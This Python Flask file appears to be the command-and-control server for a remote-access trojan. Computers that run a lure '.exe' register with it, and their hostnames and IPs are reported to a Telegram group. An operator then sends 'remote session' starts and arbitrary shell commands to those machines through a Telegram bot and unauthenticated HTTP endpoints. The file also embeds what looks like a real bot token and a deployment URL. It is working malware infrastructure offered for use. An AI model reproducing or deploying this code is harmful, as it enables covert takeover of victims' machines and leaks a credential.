from flask import Flask, request, jsonify
import json
import os
import time
import threading
import requests

app = Flask(__name__)

# ================= CONFIGURATION =================
BOT_TOKEN = "8370598742:AAGtfxRT9rVDOThRavBnq_dFJFSXyHocK1s"  # REPLACE with your actual bot token from BotFather
ADMIN_ID = 6586114356       # REPLACE with your numeric user ID (no quotes)
# =================================================

# Data storage
devices = {}
device_lock = threading.Lock()
DATA_FILE = "devices_data.json"

def load_devices():
    global devices
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            devices = json.load(f)

def save_devices():
    with open(DATA_FILE, 'w') as f:
        json.dump(devices, f, indent=2)

def send_telegram_message(chat_id, message):
    """Sends a message to a Telegram group or user"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML'}
    try:
        requests.post(url, json=data, timeout=5)
    except:
        pass

load_devices()

# ============ ENDPOINT 1: REGISTER DEVICE (.exe calls this) ============
@app.route('/register', methods=['POST'])
def register_device():
    data = request.json
    device_id = data.get('device_id')
    exe_name = data.get('exe_name')
    computer_info = data.get('computer_info')
    group_id = data.get('group_id')
    
    with device_lock:
        devices[device_id] = {
            'exe_name': exe_name,
            'computer_info': computer_info,
            'last_seen': time.time(),
            'status': 'online',
            'group_id': group_id,
            'pending_command': None
        }
        save_devices()
    
    # Notify the specific group that the .exe was clicked
    notification = f"🚨 <b>{exe_name}.exe</b> was clicked on: <code>{computer_info.get('hostname', 'Unknown')}</code> (IP: {computer_info.get('ip', 'N/A')})"
    if group_id:
        send_telegram_message(group_id, notification)
    
    return jsonify({'status': 'registered'})

# ============ ENDPOINT 2: LIST ALL DEVICES ============
@app.route('/devices', methods=['GET'])
def get_devices():
    return jsonify(devices)

# ============ ENDPOINT 3: SEND COMMAND TO DEVICE ============
@app.route('/command', methods=['POST'])
def send_command():
    data = request.json
    device_id = data.get('device_id')
    command = data.get('command')
    
    with device_lock:
        if device_id in devices:
            devices[device_id]['pending_command'] = command
            save_devices()
            return jsonify({'status': 'command sent to ' + device_id})
        else:
            return jsonify({'status': 'device not found'}), 404

# ============ ENDPOINT 4: CLEAR COMMAND AFTER EXECUTION ============
@app.route('/clear_command', methods=['POST'])
def clear_command():
    data = request.json
    device_id = data.get('device_id')
    with device_lock:
        if device_id in devices:
            devices[device_id]['pending_command'] = None
            save_devices()
    return jsonify({'status': 'cleared'})

# ============ ENDPOINT 5: TELEGRAM WEBHOOK (RECEIVES YOUR COMMANDS) ============
@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
def webhook():
    update = request.json
    
    if 'message' in update:
        chat_id = update['message']['chat']['id']
        text = update['message'].get('text', '').strip()
        
        # Security: Only respond to you (the admin)
        if chat_id != ADMIN_ID:
            send_telegram_message(chat_id, "⛔ Unauthorized access denied.")
            return 'OK', 200

        # --- COMMAND: /devices ---
        if text == '/devices':
            if not devices:
                send_telegram_message(chat_id, "📭 No devices are currently connected.")
            else:
                msg = "🖥️ <b>Connected Devices:</b>\n"
                for idx, (device_id, info) in enumerate(devices.items(), 1):
                    exe = info.get('exe_name', 'Unknown')
                    host = info.get('computer_info', {}).get('hostname', 'Unknown')
                    ip = info.get('computer_info', {}).get('ip', 'N/A')
                    status = "🟢 Online" if time.time() - info.get('last_seen', 0) < 60 else "🟡 Inactive"
                    msg += f"{idx}. <code>{device_id}</code> | {exe}.exe | {host} ({ip}) | {status}\n"
                send_telegram_message(chat_id, msg)

        # --- COMMAND: /remote DEVICE_ID ---
        elif text.startswith('/remote'):
            parts = text.split(' ', 1)
            if len(parts) < 2:
                send_telegram_message(chat_id, "⚠️ Usage: /remote DEVICE_ID")
            else:
                device_id = parts[1].strip()
                with device_lock:
                    if device_id in devices:
                        devices[device_id]['pending_command'] = "START_REMOTE"
                        save_devices()
                        send_telegram_message(chat_id, f"✅ Remote session <b>STARTING</b> on <code>{device_id}</code>. Please wait...")
                    else:
                        send_telegram_message(chat_id, f"❌ Device <code>{device_id}</code> not found. Use /devices to see available devices.")

        # --- COMMAND: /stop DEVICE_ID ---
        elif text.startswith('/stop'):
            parts = text.split(' ', 1)
            if len(parts) < 2:
                send_telegram_message(chat_id, "⚠️ Usage: /stop DEVICE_ID")
            else:
                device_id = parts[1].strip()
                with device_lock:
                    if device_id in devices:
                        devices[device_id]['pending_command'] = "STOP_REMOTE"
                        save_devices()
                        send_telegram_message(chat_id, f"🛑 Remote session <b>STOPPING</b> on <code>{device_id}</code>.")
                    else:
                        send_telegram_message(chat_id, f"❌ Device <code>{device_id}</code> not found.")

        # --- COMMAND: /cmd DEVICE_ID "your command" ---
        elif text.startswith('/cmd'):
            parts = text.split(' ', 2)
            if len(parts) < 3:
                send_telegram_message(chat_id, "⚠️ Usage: /cmd DEVICE_ID \"command\" (e.g. /cmd LAPTOP-123 calc.exe)")
            else:
                device_id = parts[1].strip()
                command = parts[2].strip()
                with device_lock:
                    if device_id in devices:
                        devices[device_id]['pending_command'] = command
                        save_devices()
                        send_telegram_message(chat_id, f"⌨️ Command <code>{command}</code> sent to <code>{device_id}</code>.")
                    else:
                        send_telegram_message(chat_id, f"❌ Device <code>{device_id}</code> not found.")

        # --- COMMAND: /help ---
        elif text == '/help':
            help_msg = (
                "🤖 <b>Available Commands:</b>\n\n"
                "/devices - List all connected devices\n"
                "/remote DEVICE_ID - Start remote session\n"
                "/stop DEVICE_ID - Stop remote session\n"
                "/cmd DEVICE_ID \"command\" - Run any command (e.g., calc.exe)\n"
                "/help - Show this menu"
            )
            send_telegram_message(chat_id, help_msg)

        else:
            send_telegram_message(chat_id, f"❓ Unknown command. Type /help for available commands.")

    return 'OK', 200

# ============ ENDPOINT 6: SET WEBHOOK (RUN THIS ONCE) ============
@app.route('/set_webhook', methods=['GET'])
def set_webhook():
    webhook_url = f"https://dollar-1rtv.onrender.com/webhook/{BOT_TOKEN}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}"
    response = requests.get(url)
    return jsonify(response.json())

# ============ ENDPOINT 7: HOME PAGE ============
@app.route('/')
def home():
    return "✅ PD_Research Final Server is RUNNING and AWAKE!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)